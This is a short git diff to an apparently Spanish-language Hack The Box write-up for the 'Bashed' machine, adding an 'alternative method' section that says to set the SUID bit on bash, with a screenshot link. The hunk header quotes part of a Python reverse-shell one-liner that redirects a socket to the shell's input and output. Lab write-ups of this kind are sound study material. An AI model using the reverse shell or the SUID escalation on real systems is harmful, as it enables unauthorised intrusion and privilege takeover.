@@ -118,6 +118,11 @@ os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess
 ![image](https://github.com/gecr07/Bashed-HTB/assets/63270579/040d5787-ea2a-494e-8854-5a44229e1c9f)
 
 
+## Metodo alternativo
+
+Volver SUID el bash 
+
+![image](https://github.com/gecr07/Bashed-HTB/assets/63270579/7c543572-6ebd-4a56-adde-c8d57aefecd2)
 
 
 
